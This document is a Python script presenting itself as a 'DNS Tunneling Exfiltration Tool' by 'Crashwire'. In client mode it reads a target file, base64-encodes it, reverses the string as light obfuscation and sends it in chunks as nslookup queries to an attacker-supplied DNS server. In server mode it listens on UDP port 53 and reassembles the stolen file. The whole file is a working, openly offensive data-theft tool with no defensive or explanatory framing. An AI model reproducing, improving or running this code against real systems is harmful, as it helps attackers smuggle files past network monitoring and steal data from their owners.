#!/usr/bin/python
import argparse
import subprocess
import socket
import base64
import os
import string

def read_and_encode_file(file_path):
    """Read the target file and encode its contents in Base64."""
    with open(file_path, 'rb') as file:
        file_content = file.read()
        encoded = base64.b64encode(file_content).decode('utf-8')  # Base64 encoding
    return encoded

def chunk_data(data, chunk_size):
    """Split data into chunks of specified size."""
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

def obfuscate_data(data):
    """Obfuscate data by reversing it (simple for demonstration)."""
    return data[::-1]

def deobfuscate_data(data):
    """Deobfuscate data by reversing it back."""
    return data[::-1]

def clean_received_data(data):
    """Filter out non-printable characters from received data."""
    return ''.join(char for char in data if char in string.printable)

def send_chunks(encoded_data, chunk_size, attacker_dns_server, domain):
    """Send encoded chunks as DNS requests."""
    chunks = chunk_data(encoded_data, chunk_size)
    for chunk in chunks:
        obfuscated_chunk = obfuscate_data(chunk)
        query = f"{obfuscated_chunk}.{domain}"
        nslookup_command = ['nslookup', query, attacker_dns_server]
        subprocess.run(nslookup_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_server(output_file, port):
    """Start a server to receive DNS queries and extract file data."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", port))
    print(f"[+] Server listening on port {port}")

    received_chunks = []
    try:
        while True:
            data, addr = sock.recvfrom(1024)  # Receive DNS query data
            
            try:
                raw_query = data.decode('utf-8', errors='ignore').strip()
                query = clean_received_data(raw_query).split('.')[0]  # Clean output
            except UnicodeDecodeError:
                print(f"[-] Received malformed data from {addr[0]}")
                continue  # Skip processing this packet

            deobfuscated_chunk = deobfuscate_data(query)
            received_chunks.append(deobfuscated_chunk)
            print(f"[+] Received cleaned chunk from {addr[0]}: {query}")

            # Stop condition (simple example)
            if "END" in query:
                print("[+] All chunks received. Reassembling file...")
                break
    except KeyboardInterrupt:
        print("[-] Server stopped.")
    finally:
        sock.close()

    # Reassemble and write the file
    reassembled_data = ''.join(received_chunks).replace("END", "")
    decoded_data = base64.b64decode(reassembled_data)
    with open(output_file, 'wb') as file:
        file.write(decoded_data)
    print(f"[+] File reassembled and saved to {output_file}")

def client_mode():
    """Interactive menu for client mode."""
    print("\n--- CLIENT MODE ---")
    file_path = input("Enter target file path for exfiltration: ").strip()
    chunk_size = int(input("Enter chunk size (default: 50): ").strip() or "50")
    server_ip = input("Enter server IP to send data to: ").strip()
    domain = input("Enter domain name for DNS tunneling: ").strip()

    print(f"\n[+] Reading and encoding file: {file_path}")
    encoded_data = read_and_encode_file(file_path)
    print(f"[+] Sending file data to server ({server_ip}) via DNS...")
    send_chunks(encoded_data, chunk_size, server_ip, domain)
    print("[+] Exfiltration completed.")

def server_mode():
    """Interactive menu for server mode."""
    print("\n--- SERVER MODE ---")
    output_file = input("Enter output file path to save extracted data: ").strip()
    port = int(input("Enter port to listen on (default: 53): ").strip() or "53")

    print(f"\n[+] Starting server on port {port}...")
    start_server(output_file, port)

def display_banner():
    banner = r"""
    ______  __   _ _______      _______  _____         _______
    |     \ | \  | |______      |  |  | |     | |      |______
    |_____/ |  \_| ______|      |  |  | |_____| |_____ |______

    [ DNS Tunneling Exfiltration Tool ]
    """
    print(banner)
    print("====================================")
    print("        Author: Crashwire")
    print("====================================\n")

def main():
    display_banner()
    while True:
        print("\n========== DNS Tunneling Tool ==========")
        print("1) Start as Client")
        print("2) Start as Server")
        print("3) Exit")
        
        choice = input("Select an option (1-3): ").strip()
        
        if choice == "1":
            client_mode()
        elif choice == "2":
            server_mode()
        elif choice == "3":
            print("Exiting program.")
            break
        else:
            print("Invalid option. Please select 1, 2, or 3.")

if __name__ == "__main__":
    main()
